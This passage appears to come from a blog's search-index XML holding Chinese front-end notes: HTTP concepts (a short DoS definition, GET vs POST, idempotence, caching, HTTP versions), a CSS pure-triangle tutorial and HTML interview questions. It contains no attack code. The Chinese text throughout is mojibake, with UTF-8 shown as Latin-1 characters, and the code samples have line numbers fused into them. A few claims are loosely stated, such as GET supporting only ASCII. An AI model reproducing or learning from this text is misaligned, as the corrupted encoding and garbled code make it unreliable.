ä½¿ç”¨ SQL é˜²æ³¨å…¥ç³»ç»Ÿã€‚ 7.5 æ‹’ç»æœåŠ¡æ”»å‡»7.5.1 æ¦‚å¿µ æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdenial-of-service attackï¼ŒDoSï¼‰ï¼Œäº¦ç§°æ´ªæ°´æ”»å‡»ï¼Œå…¶ç›®çš„åœ¨äºŽä½¿ç›®æ ‡ç”µè„‘çš„ç½‘ç»œæˆ–ç³»ç»Ÿèµ„æºè€—å°½ï¼Œä½¿æœåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ï¼Œå¯¼è‡´å…¶æ­£å¸¸ç”¨æˆ·æ— æ³•è®¿é—®ã€‚ åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdistributed denial-of-service attackï¼ŒDDoSï¼‰ï¼ŒæŒ‡æ”»å‡»è€…ä½¿ç”¨ç½‘ç»œä¸Šä¸¤ä¸ªæˆ–ä»¥ä¸Šè¢«æ”»é™·çš„ç”µè„‘ä½œä¸ºâ€œåƒµå°¸â€å‘ç‰¹å®šçš„ç›®æ ‡å‘åŠ¨â€œæ‹’ç»æœåŠ¡â€å¼æ”»å‡»ã€‚ å…«ã€GET å’Œ POST çš„åŒºåˆ«8.1 å‚æ•° GET å’Œ POST çš„è¯·æ±‚éƒ½èƒ½ä½¿ç”¨é¢å¤–çš„å‚æ•°ï¼Œä½†æ˜¯ GET çš„å‚æ•°æ˜¯ä»¥æŸ¥è¯¢å­—ç¬¦ä¸²å‡ºçŽ°åœ¨ URL ä¸­ï¼Œè€Œ POST çš„å‚æ•°å­˜å‚¨åœ¨å†…å®¹å®žä½“ä¸­ã€‚ GET çš„ä¼ å‚æ–¹å¼ç›¸æ¯”äºŽ POST å®‰å…¨æ€§è¾ƒå·®ï¼Œå› ä¸º GET ä¼ çš„å‚æ•°åœ¨ URL ä¸­æ˜¯å¯è§çš„ï¼Œå¯èƒ½ä¼šæ³„éœ²ç§å¯†ä¿¡æ¯ã€‚å¹¶ä¸” GET åªæ”¯æŒ ASCII å­—ç¬¦ï¼Œå¦‚æžœå‚æ•°ä¸ºä¸­æ–‡åˆ™å¯èƒ½ä¼šå‡ºçŽ°ä¹±ç ï¼Œè€Œ POST æ”¯æŒæ ‡å‡†å­—ç¬¦é›†ã€‚ 1GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1 123POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2 8.2 å®‰å…¨ å®‰å…¨çš„ HTTP æ–¹æ³•ä¸ä¼šæ”¹å˜æœåŠ¡å™¨çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªæ˜¯å¯è¯»çš„ã€‚ GET æ–¹æ³•æ˜¯å®‰å…¨çš„ï¼Œè€Œ POST å´ä¸æ˜¯ï¼Œå› ä¸º POST çš„ç›®çš„æ˜¯ä¼ é€å®žä½“ä¸»ä½“å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹å¯èƒ½æ˜¯ç”¨æˆ·ä¸Šä¼ çš„è¡¨å•æ•°æ®ï¼Œä¸Šä¼ æˆåŠŸä¹‹åŽï¼ŒæœåŠ¡å™¨å¯èƒ½æŠŠè¿™ä¸ªæ•°æ®å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œå› æ­¤çŠ¶æ€ä¹Ÿå°±å‘ç”Ÿäº†æ”¹å˜ã€‚ å®‰å…¨çš„æ–¹æ³•é™¤äº† GET ä¹‹å¤–è¿˜æœ‰ï¼šHEADã€OPTIONSã€‚ -ä¸å®‰å…¨çš„æ–¹æ³•é™¤äº† POST ä¹‹å¤–è¿˜æœ‰ PUTã€DELETEã€‚ 8.3 å¹‚ç­‰æ€§ å¹‚ç­‰çš„ HTTP æ–¹æ³•ï¼ŒåŒæ ·çš„è¯·æ±‚è¢«æ‰§è¡Œä¸€æ¬¡ä¸Žè¿žç»­æ‰§è¡Œå¤šæ¬¡çš„æ•ˆæžœæ˜¯ä¸€æ ·çš„ï¼ŒæœåŠ¡å™¨çš„çŠ¶æ€ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œå¹‚ç­‰æ–¹æ³•ä¸åº”è¯¥å…·æœ‰å‰¯ä½œç”¨ï¼ˆç»Ÿè®¡ç”¨é€”é™¤å¤–ï¼‰ã€‚åœ¨æ­£ç¡®å®žçŽ°çš„æ¡ä»¶ä¸‹ï¼ŒGETï¼ŒHEADï¼ŒPUT å’Œ DELETE ç­‰æ–¹æ³•éƒ½æ˜¯å¹‚ç­‰çš„ï¼Œè€Œ POST æ–¹æ³•ä¸æ˜¯ã€‚æ‰€æœ‰çš„å®‰å…¨æ–¹æ³•ä¹Ÿéƒ½æ˜¯å¹‚ç­‰çš„ã€‚ GET /pageX HTTP/1.1 æ˜¯å¹‚ç­‰çš„ã€‚è¿žç»­è°ƒç”¨å¤šæ¬¡ï¼Œå®¢æˆ·ç«¯æŽ¥æ”¶åˆ°çš„ç»“æžœéƒ½æ˜¯ä¸€æ ·çš„ï¼š 1234GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 ä¸æ˜¯å¹‚ç­‰çš„ã€‚å¦‚æžœè°ƒç”¨å¤šæ¬¡ï¼Œå°±ä¼šå¢žåŠ å¤šè¡Œè®°å½•ï¼š 123POST /add_row HTTP/1.1POST /add_row HTTP/1.1 -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1 -&gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 æ˜¯å¹‚ç­‰çš„ï¼Œå³ä¾¿æ˜¯ä¸åŒè¯·æ±‚ä¹‹é—´æŽ¥æ”¶åˆ°çš„çŠ¶æ€ç ä¸ä¸€æ ·ï¼š 123DELETE /idX/delete HTTP/1.1 -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1 -&gt; Returns 404 8.4 å¯ç¼“å­˜å¦‚æžœè¦å¯¹å“åº”è¿›è¡Œç¼“å­˜ï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š è¯·æ±‚æŠ¥æ–‡çš„ HTTP æ–¹æ³•æœ¬èº«æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ GET å’Œ HEADï¼Œä½†æ˜¯ PUT å’Œ DELETE ä¸å¯ç¼“å­˜ï¼ŒPOST åœ¨å¤šæ•°æƒ…å†µä¸‹ä¸å¯ç¼“å­˜çš„ã€‚ å“åº”æŠ¥æ–‡çš„çŠ¶æ€ç æ˜¯å¯ç¼“å­˜çš„ï¼ŒåŒ…æ‹¬ï¼š200, 203, 204, 206, 300,301, 404, 405, 410, 414, and 501ã€‚ å“åº”æŠ¥æ–‡çš„ Cache-Control é¦–éƒ¨å­—æ®µæ²¡æœ‰æŒ‡å®šä¸è¿›è¡Œç¼“å­˜ã€‚ 8.5 XMLHttpRequest ä¸ºäº†é˜è¿° POST å’Œ GET çš„å¦ä¸€ä¸ªåŒºåˆ«ï¼Œéœ€è¦å…ˆäº†è§£ XMLHttpRequestï¼š XMLHttpRequest æ˜¯ä¸€ä¸ª APIï¼Œå®ƒä¸ºå®¢æˆ·ç«¯æä¾›äº†åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è¾“æ•°æ®çš„åŠŸèƒ½ã€‚å®ƒæä¾›äº†ä¸€ä¸ªé€šè¿‡ URL æ¥èŽ·å–æ•°æ®çš„ç®€å•æ–¹å¼ï¼Œå¹¶ä¸”ä¸ä¼šä½¿æ•´ä¸ªé¡µé¢åˆ·æ–°ã€‚è¿™ä½¿å¾—ç½‘é¡µåªæ›´æ–°ä¸€éƒ¨åˆ†é¡µé¢è€Œä¸ä¼šæ‰“æ‰°åˆ°ç”¨æˆ·ã€‚XMLHttpRequest åœ¨ AJAX ä¸­è¢«å¤§é‡ä½¿ç”¨ã€‚ åœ¨ä½¿ç”¨ XMLHttpRequest çš„ POST æ–¹æ³•æ—¶ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘é€ Header å†å‘é€ Dataã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨ä¼šè¿™ä¹ˆåšï¼Œä¾‹å¦‚ç«ç‹å°±ä¸ä¼šã€‚ ä¹ã€å„ç‰ˆæœ¬æ¯”è¾ƒ9.1 HTTP/1.0 ä¸Ž HTTP/1.1 çš„åŒºåˆ« HTTP/1.1 é»˜è®¤æ˜¯æŒä¹…è¿žæŽ¥ HTTP/1.1 æ”¯æŒç®¡çº¿åŒ–å¤„ç† HTTP/1.1 æ”¯æŒè™šæ‹Ÿä¸»æœº HTTP/1.1 æ–°å¢žçŠ¶æ€ç  100 HTTP/1.1 åªæ˜¯åˆ†å—ä¼ è¾“ç¼–ç  HTTP/1.1 æ–°å¢žç¼“å­˜å¤„ç†æŒ‡ä»¤ max-age 9.2 HTTP/1.1 ä¸Ž HTTP/2.0 çš„åŒºåˆ«9.2.1 å¤šè·¯å¤ç”¨HTTP/2.0 ä½¿ç”¨å¤šè·¯å¤ç”¨æŠ€æœ¯ï¼Œä½¿ç”¨åŒä¸€ä¸ª TCP è¿žæŽ¥æ¥å¤„ç†å¤šä¸ªè¯·æ±‚ 9.2.2 é¦–éƒ¨åŽ‹ç¼©HTTP/1.1 çš„é¦–éƒ¨å¸¦æœ‰å¤§é‡ä¿¡æ¯ï¼Œè€Œä¸”æ¯æ¬¡éƒ½è¦é‡å¤å‘é€ã€‚HTTP/2.0 è¦æ±‚é€šè®¯åŒæ–¹å„è‡ªç¼“å­˜ä¸€ä»½é¦–éƒ¨å­—æ®µè¡¨ï¼Œä»Žè€Œé¿å…äº†é‡å¤ä¼ è¾“ã€‚ 9.2.3 æœåŠ¡ç«¯æŽ¨é€åœ¨å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šæŠŠç›¸å…³çš„èµ„æºä¸€èµ·å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸éœ€è¦å†æ¬¡å‘èµ·è¯·æ±‚äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯è¯·æ±‚ index.html é¡µé¢ï¼ŒæœåŠ¡ç«¯å°±æŠŠ index.js ä¸€èµ·å‘ç»™å®¢æˆ·ç«¯ 9.2.4 äºŒè¿›åˆ¶æ ¼å¼HTTP/1.1 çš„è§£æžæ˜¯åŸºäºŽæ–‡æœ¬çš„ï¼Œè€Œ HTTP/2.0 é‡‡ç”¨äºŒè¿›åˆ¶æ ¼å¼]]></content>
      <categories>
        <category>å…¶å®ƒ</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çº¯cssä¸‰è§’å½¢åŠå…¶åº”ç”¨]]></title>
    <url>%2F2018%2F03%2F27%2F%E7%BA%AFcss%E4%B8%89%E8%A7%92%E5%BD%A2%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[å‰è¨€å¯¹äºŽæ°”æ³¡å¯¹è¯æ¡†æˆ–è€…Popoverä¸Žå†…å®¹è¿žæŽ¥éƒ¨åˆ†ä¼šæœ‰å°ä¸‰è§’å½¢æ•ˆæžœï¼Œå¯èƒ½åœ¨ä»¥å‰ç›´æŽ¥ç”¨å›¾ç‰‡åŽ»å®žçŽ°ï¼Œå…¶å®žç”¨çº¯csså³å¯å®žçŽ°ï¼Œä¸‹é¢è¦å®žçŽ°çš„æ•ˆæžœåˆ†åˆ«æ˜¯å¾®ä¿¡å¯¹è¯æ¡†å’Œé¢åŒ…å±‘ï¼Œä»¥æ­¤å›žé¡¾è®°å½•ä¸€ä¸‹ã€‚ æ•ˆæžœå¦‚ä¸‹ï¼š csså†™ä¸‰è§’å½¢åŽŸç†é¦–å…ˆæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªdivå…ƒç´ çš„å®½é«˜å’Œè¾¹æ¡†ï¼Œè§‚å¯Ÿæ•ˆæžœ 1234567.demo1 &#123; width: 40px; height: 40px; border-width: 20px; border-style: solid; border-color: #ff0000 #00ff00 #0000ff #ff00ff;&#125; æ•ˆæžœ å¯ä»¥å‘çŽ°åˆ†åˆ«è§‚å¯Ÿå››è¾¹æ¡†æ˜¯æŒ‰ç±»ä¼¼ç­‰è¾¹æ¢¯å½¢ç»˜åˆ¶çš„ï¼Œå¦‚æžœè¿›ä¸€æ­¥æŠŠå®½é«˜è®¾å°ï¼Œç”šè‡³è®¾ä¸º0ï¼Œå°±ä¼šå‘ˆçŽ°ä¸ºä¸‰è§’å½¢ï¼ŒäºŽæ˜¯ 1234567.demo2 &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: #ff0000 #00ff00 #0000ff #ff00ff;&#125; æ•ˆæžœ æžœç„¶æ˜¯è¿™æ ·çš„ï¼Œä¸‹é¢è¦åšçš„æ˜¯æŠŠå…¶ä¸­æŸä¸ªä¸‰è§’å½¢å•ç‹¬æå–å‡ºæ¥æ˜¾ç¤ºï¼Œå…¶ä»–éƒ½æ˜¾ç¤ºä¸ºtransparentï¼ŒäºŽæ˜¯å°±æœ‰äº† 12345678.demo3 &#123; width: 0; height: 0; border-width: 20px; border-style: solid; border-color: transparent; border-left-color: #ff00ff;&#125; æ•ˆæžœ ä¸€ä¸ªæŒ‡å‘å³è¾¹çš„ä¸‰è§’å½¢å¤§åŠŸå‘Šæˆï¼Œè¦å…¶ä»–æ–¹å‘çš„ä¸‰è§’å½¢ï¼Œåªéœ€æ”¹å˜é€æ˜Žçš„è¾¹æ¡†å³å¯ã€‚ åº”ç”¨æœ‰æ—¶æˆ‘ä»¬ä¸éœ€è¦æ•´ä¸ªå®žå¿ƒçš„ä¸‰è§’å½¢ï¼Œè€Œåªéœ€è¦ç±»ä¼¼ä¸Ž&gt;ä¸åŒæ–¹å‘ç®­å¤´çš„æ•ˆæžœï¼Œä¾‹å¦‚popoveræ°”æ³¡æ¡†æ•ˆæžœã€‚è¿™æ ·å°±éœ€è¦ä¸¤ä¸ªä¸‰è§’å½¢é€šè¿‡é‡å é”™ä½æ¥å®žçŽ°è¿™æ ·çš„æ•ˆæžœï¼Œé‡å ä¸‰è§’å½¢Bé¢œè‰²å’Œæ°”æ³¡æ¡†èƒŒæ™¯è‰²ä¸€æ ·ï¼Œè¢«é‡å ä¸‰è§’å½¢Aé¢œè‰²å’Œæ°”æ³¡æ¡†è¾¹æ¡†é¢œè‰²ä¸€æ ·ã€‚ å®žçŽ°å¾®ä¿¡å¯¹è¯æ¡†æ•ˆæžœä¸¤ä¸ªä¸‰è§’å½¢é‡å é”™ä½ï¼Œæ„å‘³ç€è¦ä¸¤ä¸ªå…ƒç´ ï¼Œä½†æ˜¯è¿™æ ·ä¸€æ¥å°±å¢žåŠ äº†è¿™ä¸ªå°åŠŸèƒ½çš„å¤æ‚åº¦ï¼Œå…¶å®žå¯ä»¥åˆ©ç”¨æ ‡ç­¾çš„ä¼ªç±»å…ƒç´ :beforeå’Œ:afteræ¥å……å½“å…ƒç´ ç”»å‡ºä¸¤ä¸ªä¸‰è§’å½¢ã€‚ htmléƒ¨åˆ†1&lt;div class="chat-dialog"&gt;hiï¼Œåœ¨å—ï¼Ÿ&lt;/div&gt; csséƒ¨åˆ†123456789101112131415161718192021222324252627282930.chat-dialog &#123; position: relative; width: 180px; height: 32px; line-height: 32px; border-radius: 5px; margin-left: 30px; border: 1px solid #009a61; padding: 4px;&#125;.chat-dialog:before,.chat-dialog:after &#123; content: ""; display: block; position: absolute; top: 13px; left: -13px; width: 0; height: 0; border-width: 6px; border-color: transparent; border-style: solid; border-right-color: #009a61;&#125;.chat-dialog:after &#123; left: -12px; border-right-color: #fff;&#125; æ•ˆæžœ å®žçŽ°é¢åŒ…å±‘æ•ˆæžœåŒæ ·çš„å®žçŽ°é¢åŒ…å±‘æ•ˆæžœï¼Œåªæ˜¯åœ¨æ¯å—åŽé¢ç•™å‡ºç©ºä½ï¼Œå†ç”¨ä¼ªç±»å…ƒç´ :beforeå’Œ:afterå®šä½å‡ºç®­å¤´æ•ˆæžœ htmléƒ¨åˆ† 123456&lt;ul class="tag-tab"&gt; &lt;li&gt;ç¬¬ä¸€çº§&lt;/li&gt; &lt;li&gt;ç¬¬äºŒçº§&lt;/li&gt; &lt;li&gt;ç¬¬ä¸‰çº§&lt;/li&gt; &lt;li&gt;ç¬¬å››çº§&lt;/li&gt;&lt;/ul&gt; csséƒ¨åˆ† 1234567891011121314151617181920212223242526272829303132333435363738.tag-tab &#123; font-size: 16px; height: 24px; list-style: none;&#125;.tag-tab li &#123; float: left; position: relative; padding-right: 12px;&#125;.tag-tab&gt;li:before,.tag-tab&gt;li:after &#123; position: absolute; top: 0; right: -12px; border-width: 12px; border-color: transparent; border-left-color: #333; border-style: solid; content: ""; z-index: 1;&#125;.tag-tab&gt;li:after &#123; right: -11px; border-left-color: #fff;&#125;.tag-tab&gt;li:hover &#123; color: #009a61;&#125;.tag-tab&gt;li:hover:before &#123; border-left-color: #009a61;&#125; æ•ˆæžœ å½“ç„¶ï¼Œè¿˜æ˜¯css3é€šè¿‡æ—‹è½¬å®žçŽ°çš„æ–¹æ³•ï¼Œç®€å•ç²—æš´ï¼Œåˆ°åŽé¢åœ¨è¡¥å……äº†ã€‚è¿˜æœ‰ä»€ä¹ˆå¥½æ–¹æ³•æ¬¢è¿Žæå‡ºå“ˆã€‚]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•ä¹‹html]]></title>
    <url>%2F2018%2F03%2F05%2Finter-html%2F</url>
    <content type="text"><![CDATA[Doctypeä½œç”¨ï¼Ÿæ ‡å‡†æ¨¡å¼ä¸Žå…¼å®¹æ¨¡å¼å„æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ &lt;!DOCTYPE&gt;å£°æ˜Žä½äºŽä½äºŽ HTML æ–‡æ¡£ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå¤„äºŽ &lt;html&gt; æ ‡ç­¾ä¹‹å‰ã€‚å‘ŠçŸ¥æµè§ˆå™¨çš„è§£æžå™¨ç”¨ä»€ä¹ˆæ–‡æ¡£æ ‡å‡†è§£æžè¿™ä¸ªæ–‡æ¡£ã€‚DOCTYPEä¸å­˜åœ¨æˆ–æ ¼å¼ä¸æ­£ç¡®ä¼šå¯¼è‡´æ–‡æ¡£ä»¥å…¼å®¹æ¨¡å¼å‘ˆçŽ°ã€‚ æ ‡å‡†æ¨¡å¼çš„æŽ’ç‰ˆ å’Œ JS è¿ä½œæ¨¡å¼éƒ½æ˜¯ä»¥è¯¥æµè§ˆå™¨æ”¯æŒçš„æœ€é«˜æ ‡å‡†è¿è¡Œã€‚åœ¨å…¼å®¹æ¨¡å¼ä¸­ï¼Œé¡µé¢ä»¥å®½æ¾çš„å‘åŽå…¼å®¹çš„æ–¹å¼æ˜¾ç¤º,æ¨¡æ‹Ÿè€å¼æµè§ˆå™¨çš„è¡Œä¸ºä»¥é˜²æ­¢ç«™ç‚¹æ— æ³•å·¥ä½œã€‚ ps:å¸¸è§ dotypeï¼š HTML4.01 strictï¼šä¸å…è®¸ä½¿ç”¨è¡¨çŽ°æ€§ã€åºŸå¼ƒå…ƒç´ ï¼ˆå¦‚ fontï¼‰ä»¥åŠ framesetã€‚å£°æ˜Žï¼š&lt;!DOCTYPE HTML PUBLIC â€œ-//W3C//DTD HTML 4.01//ENâ€ â€œhttp://www.w3.org/TR/html4/strict.dtd&quot;&gt; HTML4.01 Transitional:å…è®¸ä½¿ç”¨è¡¨çŽ°æ€§ã€åºŸå¼ƒå…ƒç´ ï¼ˆå¦‚ fontï¼‰ï¼Œä¸å…è®¸ä½¿ç”¨ framesetã€‚å£°æ˜Žï¼š&lt;!DOCTYPE HTML PUBLIC â€œ-//W3C//DTD HTML 4.01 Transitional//ENâ€ â€œhttp://www.w3.org/TR/html4/loose.dtd&quot;&gt; HTML4.01 Frameset:å…è®¸è¡¨çŽ°æ€§å…ƒç´ ï¼ŒåºŸæ°”å…ƒç´ ä»¥åŠ framesetã€‚å£°æ˜Žï¼š&lt;!DOCTYPE HTML PUBLIC â€œ-//W3C//DTD HTML 4.01 Frameset//ENâ€ â€œhttp://www.w3.org/TR/html4/frameset.dtd&quot;&gt; XHTML1.0 Strict:ä¸ä½¿ç”¨å…è®¸è¡¨çŽ°æ€§ã€åºŸå¼ƒå…ƒç´ ä»¥åŠ framesetã€‚æ–‡æ¡£å¿…é¡»æ˜¯ç»“æž„è‰¯å¥½çš„ XML æ–‡æ¡£ã€‚å£°æ˜Žï¼š&lt;!DOCTYPE html PUBLIC â€œ-//W3C//DTD XHTML 1.0 Strict//ENâ€ â€œhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt; XHTML1.0 Transitional:å…è®¸ä½¿ç”¨è¡¨çŽ°æ€§ã€åºŸå¼ƒå…ƒç´ ï¼Œä¸å…è®¸ framesetï¼Œæ–‡æ¡£å¿…é¡»æ˜¯ç»“æž„è‰¯å¥½çš„ XMl æ–‡æ¡£ã€‚å£°æ˜Žï¼š &lt;!DOCTYPE html PUBLIC â€œ-//W3C//DTD XHTML 1.0 Transitional//ENâ€ â€œhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; XHTML 1.0 Frameset:å…è®¸ä½¿ç”¨è¡¨çŽ°æ€§ã€åºŸå¼ƒå…ƒç´ ä»¥åŠ framesetï¼Œæ–‡æ¡£å¿…é¡»æ˜¯ç»“æž„è‰¯å¥½çš„ XML æ–‡æ¡£ã€‚å£°æ˜Žï¼š&lt;!DOCTYPE html PUBLIC â€œ-//W3C//DTD XHTML 1.0 Frameset//ENâ€ â€œhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd&quot;&gt;HTML 5: &lt;!doctype html&gt; HTML5 ä¸ºä»€ä¹ˆåªéœ€è¦å†™ &lt;!DOCTYPE HTML&gt;ï¼Ÿ HTML5 ä¸åŸºäºŽ SGMLï¼ˆæ ‡å‡†ç»Ÿç”¨æ ‡è®°è¯­è¨€ï¼‰ï¼Œå› æ­¤ä¸éœ€è¦å¯¹ DTD è¿›è¡Œå¼•ç”¨ï¼Œä½†æ˜¯éœ€è¦ doctype æ¥è§„èŒƒæµè§ˆå™¨çš„è¡Œä¸ºï¼ˆè®©æµè§ˆå™¨æŒ‰ç…§å®ƒä»¬åº”è¯¥çš„æ–¹å¼æ¥è¿è¡Œï¼‰ï¼› è€Œ HTML4.01 åŸºäºŽ SGML,æ‰€ä»¥éœ€è¦å¯¹ DTD è¿›è¡Œå¼•ç”¨ï¼Œæ‰èƒ½å‘ŠçŸ¥æµè§ˆå™¨æ–‡æ¡£æ‰€ä½¿ç”¨çš„æ–‡æ¡£ç±»åž‹ã€‚ è¡Œå†…å…ƒç´ æœ‰å“ªäº›ï¼Ÿå—çº§å…ƒç´ æœ‰å“ªäº›ï¼Ÿ ç©º(void)å…ƒç´ æœ‰é‚£äº›ï¼Ÿ è¡Œå†…å…ƒç´ æœ‰ï¼ša b span img input select strongâ€¦ å—çº§å…ƒç´ æœ‰ï¼šdiv ul ol li dl dt dd h1 h2 h3 pâ€¦ å¸¸ç”¨çš„ç©ºå…ƒç´ æœ‰ï¼š&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;link&gt; &lt;meta&gt;â€¦ ä»‹ç»ä¸€ä¸‹ä½ å¯¹æµè§ˆå™¨å†…æ ¸çš„ç†è§£ï¼Ÿä¸»è¦åˆ†æˆä¸¤éƒ¨åˆ†ï¼šæ¸²æŸ“å¼•æ“Ž(layout engineer æˆ– Rendering Engine)å’Œ JS å¼•æ“Žã€‚ æ¸²æŸ“å¼•æ“Žï¼šè´Ÿè´£å–å¾—ç½‘é¡µçš„å†…å®¹ï¼ˆHTMLã€XMLã€å›¾åƒç­‰ç­‰ï¼‰ã€æ•´ç†è®¯æ¯ï¼ˆä¾‹å¦‚åŠ å…¥ CSS ç­‰ï¼‰ï¼Œä»¥åŠè®¡ç®—ç½‘é¡µçš„æ˜¾ç¤ºæ–¹å¼ï¼Œç„¶åŽä¼šè¾“å‡ºè‡³æ˜¾ç¤ºå™¨æˆ–æ‰“å°æœºã€‚æµè§ˆå™¨çš„å†…æ ¸çš„ä¸åŒå¯¹äºŽç½‘é¡µçš„è¯­æ³•è§£é‡Šä¼šæœ‰ä¸åŒï¼Œæ‰€ä»¥æ¸²æŸ“çš„æ•ˆæžœä¹Ÿä¸ç›¸åŒã€‚æ‰€æœ‰ç½‘é¡µæµè§ˆå™¨ã€ç”µå­é‚®ä»¶å®¢æˆ·ç«¯ä»¥åŠå…¶å®ƒéœ€è¦ç¼–è¾‘ã€æ˜¾ç¤ºç½‘ç»œå†…å®¹çš„åº”ç”¨ç¨‹åºéƒ½éœ€è¦å†…æ ¸ã€‚ JS å¼•æ“Žåˆ™ï¼šè§£æžå’Œæ‰§è¡Œ javascript æ¥å®žçŽ°ç½‘é¡µçš„åŠ¨æ€æ•ˆæžœã€‚ æœ€å¼€å§‹æ¸²æŸ“å¼•æ“Žå’Œ JS å¼•æ“Žå¹¶æ²¡æœ‰åŒºåˆ†çš„å¾ˆæ˜Žç¡®ï¼ŒåŽæ¥ JS å¼•æ“Žè¶Šæ¥è¶Šç‹¬ç«‹ï¼Œå†…æ ¸å°±å€¾å‘äºŽåªæŒ‡æ¸²æŸ“å¼•æ“Žã€‚ å¸¸è§çš„æµè§ˆå™¨å†…æ ¸æœ‰å“ªäº›ï¼Ÿ Trident å†…æ ¸ï¼šIE,MaxThon,TT,The World,360,æœç‹—æµè§ˆå™¨ç­‰ã€‚[åˆç§° MSHTML] Gecko å†…æ ¸ï¼šNetscape6 åŠä»¥ä¸Šç‰ˆæœ¬ï¼ŒFF,MozillaSuite/SeaMonkey ç­‰ Presto å†…æ ¸ï¼šOpera7 åŠä»¥ä¸Šã€‚ [Opera å†…æ ¸åŽŸä¸ºï¼šPrestoï¼ŒçŽ°ä¸ºï¼šBlink;] Webkit å†…æ ¸ï¼šSafari,Chrome ç­‰ã€‚ [ Chrome çš„ï¼šBlinkï¼ˆWebKit çš„åˆ†æ”¯ï¼‰] html5 æœ‰å“ªäº›æ–°ç‰¹æ€§ã€ç§»é™¤äº†é‚£äº›å…ƒç´ ï¼Ÿå¦‚ä½•å¤„ç† HTML5 æ–°æ ‡ç­¾çš„æµè§ˆå™¨å…¼å®¹é—®é¢˜ï¼Ÿå¦‚ä½•åŒºåˆ† HTML å’Œ HTML5ï¼Ÿ HTML5 çŽ°åœ¨å·²ç»ä¸æ˜¯ SGML çš„å­é›†ï¼Œä¸»è¦æ˜¯å…³äºŽå›¾åƒï¼Œä½ç½®ï¼Œå­˜å‚¨ï¼Œå¤šä»»åŠ¡ç­‰åŠŸèƒ½çš„å¢žåŠ ã€‚ ç»˜ç”» canvas; ç”¨äºŽåª’ä»‹å›žæ”¾çš„ video å’Œ audio å…ƒç´ ; æœ¬åœ°ç¦»çº¿å­˜å‚¨ localStorage é•¿æœŸå­˜å‚¨æ•°æ®ï¼Œæµè§ˆå™¨å…³é—­åŽæ•°æ®ä¸ä¸¢å¤±; sessionStorage çš„æ•°æ®åœ¨æµè§ˆå™¨å…³é—­åŽè‡ªåŠ¨åˆ é™¤; è¯­æ„åŒ–æ›´å¥½çš„å†…å®¹å…ƒç´ ï¼Œæ¯”å¦‚ articleã€footerã€headerã€navã€section; è¡¨å•æŽ§ä»¶ï¼Œcalendarã€dateã€timeã€emailã€urlã€search; æ–°çš„æŠ€æœ¯ webworker, websocket, Geolocation; ç§»é™¤çš„å…ƒç´ ï¼š çº¯è¡¨çŽ°çš„å…ƒç´ ï¼šbasefontï¼Œbigï¼Œcenterï¼Œfont, sï¼Œstrikeï¼Œttï¼Œu; å¯¹å¯ç”¨æ€§äº§ç”Ÿè´Ÿé¢å½±å“çš„å…ƒç´ ï¼šframeï¼Œframesetï¼Œnoframesï¼› æ”¯æŒ HTML5 æ–°æ ‡ç­¾ï¼šIE8/IE7/IE6 æ”¯æŒé€šè¿‡ document.createElement æ–¹æ³•äº§ç”Ÿçš„æ ‡ç­¾ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§è®©è¿™äº›æµè§ˆå™¨æ”¯æŒ HTML5 æ–°æ ‡ç­¾ï¼Œæµè§ˆå™¨æ”¯æŒæ–°æ ‡ç­¾åŽï¼Œè¿˜éœ€è¦æ·»åŠ æ ‡ç­¾é»˜è®¤çš„æ ·å¼ã€‚ å½“ç„¶ä¹Ÿå¯ä»¥ç›´æŽ¥ä½¿ç”¨æˆç†Ÿçš„æ¡†æž¶ã€æ¯”å¦‚ html5shim; 12345&lt;!--[if lt IE 9]&gt; &lt;script&gt; src = 'http://html5shim.googlecode.com/svn/trunk/html5.js' &lt;/script&gt;&lt;![endif]--&gt; å¦‚ä½•åŒºåˆ† HTML5ï¼š DOCTYPE å£°æ˜Ž\æ–°å¢žçš„ç»“æž„å…ƒç´ \åŠŸèƒ½å…ƒç´  ç®€è¿°ä¸€ä¸‹ä½ å¯¹ HTML è¯­ä¹‰åŒ–çš„ç†è§£ï¼Ÿ ç”¨æ­£ç¡®çš„æ ‡ç­¾åšæ­£ç¡®çš„äº‹æƒ…ã€‚ html 